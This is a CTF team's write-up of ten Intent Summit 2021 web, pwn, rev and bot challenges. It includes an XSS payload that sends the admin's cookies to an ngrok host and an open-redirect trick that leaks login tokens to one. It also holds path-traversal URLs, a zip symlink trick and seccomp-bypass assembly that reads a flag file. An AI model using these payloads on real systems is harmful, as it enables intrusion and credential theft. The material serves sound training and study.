---
title: "Intent Summit 2021 CTF"
date: 2021-11-16T21:36:08+01:00 
tags: ["pwn", "rev", "web", "intent", "bot"]
author: havce
description: A fun CTF where we came in eighth out of 90 teams! We focussed mainly on web and rev/pwn challenges. It was really fun!
---

| Challenge | Category | Points |
| --- | ----------- | --- |
| [Door (un)Locked](#door-unlocked) | [web](/tags/web/) | 100 | 
| [Careers](#careers) | [web](/tags/web/) | 100 |
| [GraphiCS](#graphics) | [web](/tags/web/) | 150 |
| [Etulosba](#etulosba) | [web](/tags/web/) | 200 |
| [Darknet Club](#darknet-club) | [web](/tags/web/) | 200 |
| [Flag Vault](#flag-vault) | [web](/tags/web/) | 250 |
| [Mass Notes](#mass-notes) | [web](/tags/web/) | 250 |
| [Pattern Institute](#pattern-institute) | [pwn](/tags/pwn/) | 450 |
| [Scadomware](#scadomware) | [rev](/tags/rev/) | 300 |
| [Electron](#electron) | [bot](/tags/bot/) | 50 |


# Door (un)Locked
> Some researchers started deploying a website for their CTF, but something went wrong with the defined policies when trying to hide the flags.
Can you find the weak link?

**Description**

This challenge presents a plain static website and an attachment called `ha.cfg`, which is the config file for [HAProxy](http://www.haproxy.org/). In the file there are two interesting entries:
```plaintext
http-request deny if { path_beg /flag }
http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ }
```
We can guess that the flag is hidden behind the `/flag` endpoint.

**Solution**

My first approach was to try and break the regex, with disappointing results. I then educated myself on [HTTP Smuggling attacks](https://portswigger.net/web-security/request-smuggling). And guess what?! HAProxy version < 2.0.25, 2.2.17, 2.3.14 and 2.4.4 are vulnerable to an [Integer Overflow attack](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/) that enables HTTP Smuggling!

After a few unfortunate manual takes, I used [this tool](https://github.com/alikarimi999/CVE-2021-40346/blob/main/exploit.py) which worked like a charm.

```plaintext
...
HTTP/1.1 200 OK
server: nginx/1.21.4
date: Wed, 17 Nov 2021 00:09:42 GMT
content-type: text/html
content-length: 29
last-modified: Fri, 12 Nov 2021 20:51:37 GMT
etag: "618ed3d9-1d"
accept-ranges: bytes

INTENT{Smuggl3_w1th_H4_Pr0xy}
```

# Careers
> We got hacked,
we're trying to indentify the ROOT cause.
If you are a l33t h4x0r, please upload your resume.

**Description**

The attached URL brings us to a website which has a *Careers* section, where we can upload our résumé in .txt format, zipped. We are pretty sure we need to tinker with this upload form in order to get our flag.

**Solution**

Well, first things first, when we deal with upload forms and zips, I always try to add - let's say - *interesting* files to my compressed archive.
```bash
# Let's try the oldest trick in the book
ln -fs ../../../../../flag havce.txt
zip --symlinks havce.zip havce.txt
```
Let's apply to this job with this resume. 🤭

```bash
INTENT{zipfiles_are_awsome_for_pt}
```

# GraphiCS
> What is your problem?
How didn't you approve my beautiful innovative page on your "precious" CTF?!
It's all done, maybe I can just add some graphics.

**Description**

The challenge presents a website that makes a single query to a GraphQL endpoint. We probably need to extract the flag from there.

**Solution**

Immediately tried introspection, but it was disabled. Luckily we can abuse the autocorrection feature and this tool: https://github.com/nikitastupin/clairvoyance/, using a decent word list will reveal that we can use this query to get the flag:

```json
{"operationName":"ExampleQuery","variables":{},"query":"query ExampleQuery { _secret { flag } }\n"}
```

# Etulosba
> Our spy managed to steal the source code for the Etulosba CDN. We need your help to get the flag from that server.

**Description**

We are provided with the source code of what supposedly is a CDN: 

```javascript
const fs = require("fs");
const path = require("path");
const express = require("express");

const server = express();

server.get("/", function (req, res) {
    res.end("<html><body>etulosba</body></html>");
});

server.get("/files/images/:name", function (req, res) {
    if (req.params.name.indexOf(".") === -1) {
        return res.status(400).json({ error: "invalid file name" });
    }

    res.sendFile(__dirname + path.join("/files/images/", req.params.name));
});

server.get("/files/binary/:name", function (req, res) {
    if (req.params.name.indexOf(".") !== -1) {
        return res.status(400).json({ error: "invalid file name" });
    }

    res.sendFile(path.resolve(__dirname, "/files/binary/", req.params.name));
});

fs.writeFileSync(path.join(__dirname, "flag.name"), process.env.FLAG_NAME);
fs.writeFileSync(path.join("/tmp", process.env.FLAG_NAME), process.env.FLAG);

server.listen(process.env.HTTP_PORT);
```

**Solution**

By quickly looking at the code we can see the usage of `path.join` and `path.resolve` with user input which can be quite dangerous. Indeed the two endpoints provide two vulnerabilities: we can first read the `flag.name` file by requesting `https://etulosba.chal.intentsummit.org/files/images/%2E%2E%2F%2E%2E%2Fflag%2Ename` and then query it's contents with `https://etulosba.chal.intentsummit.org/files/binary/%2Ftmp%2Fimaflagimaflag`


# Darknet Club
> There is a new invite system for the most exclusive darknet websites.
Can you help me get an in?

**Description**

The challenge let us register an account and then present us a simple profile page with the ability to ask the "admin" to review our profile. This looked like an XSS challenge.

**Solution**

First we checked all inputs to see whether they were sanitized and indeed the referral input wasn't. I quickly tried an XSS payload to steal the admin's cookies, but realized CSP was enabled and that we needed some other way. At that point I realized I could upload a profile picture, but that required a JPEG file which appeared to be checked for the magic bytes only. At this point the route was clear:

1) Upload a "valid" JPEG file that's also a malicious JS script:

```javascript
ÿØÿî = 1;
location.href="//xxxx-xx-xx-xx-xx.ngrok.io?cookies="+document.cookie;
```

2) Set the referral to load the image as the script:

```html
<script src="https://darknet-club.chal.intentsummit.org/api/avatar/havce_test"></script>
```

3) Request a review by the admin

# Flag Vault
> We found a publicly accessible Flag Vault server. Can you find a way to steal the flag from the site admin?

**Description**

The challenge contains a simple login page that seems to never login and is not vulnerable to basic SQLi. JWT tokens also look same after a bit of fuzzing.

**Solution**

The report button suggests we probably need to send a malicious URL to the "admin". Seems easy, but it appears to check the domain of the URL to be the same of website the challenge is on. Upon visiting `/admin`, we are redirected to `/?redirect=/admin&error=INVALID_TOKEN` which probably means we will be redirect to the given URL upon successful login (something we cannot test). Checking the redirect login we can see it's not very safe:

```javascript
window.location = location.origin + redirectTo + "?token=" + jsonData.token;
```

Because it is done with simple concatenation we can use the `@` trick to fool the admin's browser into redirecting him to a malicious link with the token as a query parameter when he logs in (which he does!):

https://flag-vault.chal.intentsummit.org/?redirect=@xxxx-xx-xx-xx-xx.ngrok.io/

After receiving the token, which expires in 10 seconds, we can quickly login and get the flag. 


# Mass Notes
> We know the flag is on the Mass Notes servers, can you get it for us?

**Description**

The app simply lets us create notes which are stored on a MongoDB server. I spent a lot of time investigating a possible MongoDB injection, but that wasn't it (sort of).

**Solution**

A common problem with MongoDB (and NoSQL) implementations is being able to override parameters set in the code with ones of our choice. We can override a couple, but most notably `avatar`. By messing with a bit, we can see that the avatar for our notes is not visible anymore and that an error is returned instead. `../../flag` appears to be a good avatar to get the flag!

# Pattern Institute
> It is you against the Pattern Institute!
> 
> However, Pattern Institute know what they're up against, so they shut down all their systems, except a sandboxed one, in which they allow only limited operations for their operatives to run.
> 
> Our researchers were able to gain hold of the sandbox source code and chain some cool vulnerabilities in Pattern Institute's sandbox, to eventualy get an arbitrary binary to run on that system! but it's been a long time since they've played in the sand.
> 
> Your job is to steal an important file from their system's /home folder and report its contents back to headquarters.

**Description**

The challenge attachments included the URL of the remote server and a Go program which constituted the sandbox.

We can execute code on the machine but only a few syscalls are permitted! All the other ones are blocked through a seccomp filter.

*Allowed* syscalls:
 - mmap
 - mprotect
 - write
 - open
 - close
 - fstat
 - execve
 - arch_prctl
 - stat
 - futex
 - exit_group

From the challenge description we can guess that we need to exfiltrate `/home/flag.txt`.

**Solution**

My first try was to write a C program that used `open`, `read` and `write`, but libc implements the `open` function with the `openat` syscall, so I cried in `SIGSEGV` and decided to try to write something in amd64 assembly.

So I started to write an asm program that:
 - `open`-ed the file (`/home/flag.txt`)
 - `read`-ed the file (yes, I know)
 - `write`-ed the file to stdout.

Simple, elegant and linear, it worked on my machine™️ but not on the remote one!
It took me a while (and a Discord message from Gianluca) to realize that the `read` syscall was blocked. Bummer.

From this point on Gianluca took over and the program now:
 - `open`-ed the file
 - allocated the `stat` struct on the stack
 - called `fstat` syscall
 - `mmap`-ed the file descriptor of the file previously opened to a random place on memory.
 - `write`-ed to stdout the content of the mapping (the file content, i.e. the flag).

```x86asm=amd64
global _start

section .text

_start:

  mov     rax, 2          ; "open"
  mov     rdi, path       ;
  xor     rsi, rsi        ; O_RDONLY
  syscall

  mov     rdi, rax        ; fd (returned from open)
  sub     rsp, 144        ; allocate stat struct
  mov     rsi, rsp        ; address of 'struct stat'
  mov     rax, 5          ; "fstat" syscall
  syscall

  mov     rsi, [rsp+48]   ; len = file size (from 'struct stat')
  add     rsp, 144        ; free 'struct stat'
  mov     r8, rdi         ; fd (still in rdi from last syscall)
  xor     rdi, rdi        ; address = 0
  mov     rdx, 0x1        ; protection = PROT_READ
  mov     r10, 0x2        ; flags = MAP_PRIVATE
  xor     r9, r9          ; offset = 0
  mov     rax, 9          ; "mmap" syscall
  syscall

  mov     rdx, rsi        ; count (file size from last call)
  mov     rsi, rax        ; buffer address (returned from mmap)
  mov     rdi, 1          ; fd = stdout
  mov     rax, 1          ; "write" syscall
  syscall

  mov rax, 231      ;
  mov rdi, 0        ;   EXIT_SUCCESS
  syscall           ; );

section .rodata
  path: db "/home/flag.txt",0
```

Compile and link with:
```bash
nasm -f elf64 -o exploit.o exploit.asm
ld -o exploit exploit.o
```

To launch the exploit we needed to convert the binary to base64 and add it to the challenge website query string.
```python
import base64
import urllib.parse

with open('exploit', 'rb') as f:
    content = f.read()

payload = base64.b64encode(content).decode()
payload = urllib.parse.quote(payload)
print("http://patterni.chal.intentsummit.org:9090/?arg="+payload)
```

```plaintext
INTENT{pl4y1n6_1n_7h3_54nd_15_d4n63r0u5}
```

# Scadomware
> Someone hacked my OT network and dropped a ransomware! plz h3lp me recover this encrypted file!

**Description**

We are provided a sample of a ransomware and an encrypted file. Our task is to decrypt such file.

**Solution**

The executable main function is to enumerate files and encrypt them all. The encryption is done with AES/CBC the IV is fixed in the code and the key is the SHA1 of some string which is the concatenation of:

- A generated static string `YouTakeTheRedPillYouStayInWonderlandAndIShowYouHowDeepTheRabbitHoleGoes`
- `0mgisthebestg`
- A number contained in the encrypt file from 10-14 bytes in hex
- The original file size contained in the encrypted file from 6-10 bytes 
- `---`
- The int checksum of the computer physical address (which we don't know)

Be ware that the SHA1 output length isn't enough for the AES key and therefore some of it is initialized with a simple function. The solve script is as follows:

```python
import hashlib

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Util.number import bytes_to_long

with open('important.intent.enc', 'rb') as f:
    encrypted_file = f.read()
    original_size = bytes_to_long(encrypted_file[6:10][::-1])
    big_num = bytes_to_long(encrypted_file[10:14][::-1])
    encrypted_file = encrypted_file[14:-4]


def decrypt(ip_int):
    hash_input = '{0:}0mgisthebestg{1:08x}{2:}---{3:}'.format(
        'YouTakeTheRedPillYouStayInWonderlandAndIShowYouHowDeepTheRabbitHoleGoes', big_num, original_size, ip_int)
    hash_bytes = hashlib.sha1(hash_input.encode()).digest()

    aes_key = bytearray([0] * 32)
    for i in range(32):
        aes_key[i] = (i - 0x5b) % 256

    for i in range(len(hash_bytes)):
        aes_key[i] = hash_bytes[i]

    cipher = AES.new(bytes(aes_key), AES.MODE_CBC, b'0010000300003007')
    out = unpad(cipher.decrypt(encrypted_file), 16)
    print(out.decode())


def main():
    ip_int = 0
    while True:
        try:
            decrypt(ip_int)
            break
        except:
            pass

        ip_int += 1


if __name__ == '__main__':
    main()
```

To generate the static string I used this C program, mainly copy-pasted from the decompiler:

```c
#include <stdio.h>
#include <stdlib.h>

char *  calcPass(char *input1,char *input2)
{
  char *pbVar1;
  char cVar2;
  uint outLen;
  char *in2len;
  char *res;
  uint index;
  uint uVar3;

  in2len = input1;
  do {
    cVar2 = *in2len;
    in2len = in2len + 1;
  } while (cVar2 != '\0');
  outLen = (int)in2len - (int)(input1 + 1);
  in2len = input2;
  do {
    cVar2 = *in2len;
    in2len = in2len + 1;
  } while (cVar2 != '\0');
  res = (char *)malloc(outLen + 1);
  index = 0;
  if (outLen != 0) {
    do {
      uVar3 = index % (unsigned int)((int)in2len - (int)(input2 + 1));
      pbVar1 = (char *)(res + index);
      index = index + 1;
      *pbVar1 = input2[uVar3] ^ pbVar1[(int)input1 - (int)res];
    } while (index < outLen);
    res[outLen] = '\0';
    return res;
  }
  *res = '\0';
  return res;
}

int main() {
    char* in1 = "h\\FgR\\Tg[VaRUcZ__n^F`GRNx]d\\]STA_R]Sp]Wz`_^Dj\\F\x7f^DwVVGe[VaRUSZG{\\[Tt\\V@";
    char in2 [] = {0x31, 0x33, 0x33, 0x33, 0x33, 0x37, 0};
    char* pass = calcPass(in1, (char*)&in2);
    printf("%s\n", pass);
}
```


# Electron
> Shoperfect now has a new bug bounty program to help mitigate bot activity on their website.
> You need to buy premium items from Shoperfect, but you need to be fast.

**Description**

The challenge required to write a simple bot program to get the flag very quickly.

**Solution**

With a bit of reverse engineering of the `merge` function and the rude fingerprinting code, we can write such a script to get the flag:

```python
import re
import requests


def merge(in1, in2):
    out = ''
    for i in range(len(in1)):
        out += in1[i] + in2[i % min(len(in1), len(in2))]

    return out


resp = requests.get('https://electron.chal.intentsummit.org/start?id=1', verify=False)
product_id = int(re.findall(r'/get_limited_item/(\d+)', resp.text)[0])
if product_id % 2 == 0:
    product_id = product_id // 2
else:
    product_id = product_id * 3 + 1

print('PRODUCT', product_id)

resp = requests.get(f'https://electron.chal.intentsummit.org/get_limited_item/{product_id}', verify=False)
if 'Sorry, bot are not allowed on our website' in resp.text:
    print('RETRY')
    exit(1)

secret = re.findall(r'<input type="hidden" value="(.*?)" style="visibility: hidden" id="secret" name="secret">', resp.text)[0]
print('SECRET', secret)

sig = merge('343d9040a671c45832ee5381860e2996', secret)
print('SIG', sig)

resp = requests.post('https://electron.chal.intentsummit.org/send_offer', data={
    'Do you like spicy potatoes ?': 'yes',
    'Do you like sausages ?': 'yes',
    'Are you sure ?': 'yes',
    'secret': secret,
    'sig': sig,
}, verify=False)
print(resp.status_code, resp.text)
```
